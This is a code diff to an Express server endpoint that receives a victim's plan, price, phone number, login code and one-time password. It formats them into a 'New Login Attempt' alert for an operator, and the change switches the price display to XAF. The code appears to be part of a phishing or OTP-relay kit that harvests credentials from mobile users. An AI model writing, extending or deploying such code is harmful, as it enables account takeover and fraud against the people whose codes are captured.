@@ -61,6 +61,10 @@ setInterval(() => {
 app.post('/api/request-approval', async (req, res) => {
   const { plan, price, phone, step, code, otp } = req.body || {};
   const id = makeId();
+  const priceValue = price == null ? '' : String(price).trim();
+  const displayPrice = priceValue
+    ? /xaf/i.test(priceValue) ? priceValue : `XAF ${priceValue}`
+    : '—';
 
   requests.set(id, {
     status: 'pending',
@@ -83,7 +87,7 @@ app.post('/api/request-approval', async (req, res) => {
     const text =
       `🔔 *New Login Attempt — ${stepLabel}*\n\n` +
       `📦 Data: ${plan || '—'}\n` +
-      `💰 Price: USD ${price || '—'}\n` +
+      `💰 Price: ${displayPrice}\n` +
       `📱 Phone: \`${phone || '—'}\`\n` +
       secretLine;
       
